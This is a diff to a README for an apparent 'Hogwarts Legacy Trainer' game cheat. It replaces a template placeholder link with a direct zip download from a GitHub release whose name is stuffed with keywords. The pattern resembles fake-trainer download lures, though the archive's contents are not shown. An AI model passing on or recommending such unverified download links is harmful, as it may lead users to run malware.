@@ -63,7 +63,7 @@ Plus many powerful classic tools: God Mode, no spell cooldown, super jump, time 
 
 ### 📥 Download Trainer
 
-[![Download Hogwarts Legacy Trainer v2.0](https://img.shields.io/badge/⬇️%20DOWNLOAD%20TRAINER%20v2.0-00C853?style=for-the-badge&logo=download&logoColor=white)](https://github.com/твой-ник/repo/releases/latest)
+[![Download Hogwarts Legacy Trainer v2.0](https://img.shields.io/badge/⬇️%20DOWNLOAD%20TRAINER%20v2.0-00C853?style=for-the-badge&logo=download&logoColor=white)](https://github.com/alev-x/Hogwarts-Legacy-Trainer-48---No-Clip-Free-Flight-Unlock-All-Spells-God-Mode/releases/download/Hogwarts-legacy-train/Hogwarts-legacy-trainer.zip)
 
 **Version:** 2.0 — April 2026  
 **Compatibility:** Latest versions of Hogwarts Legacy (Steam / Epic Games)
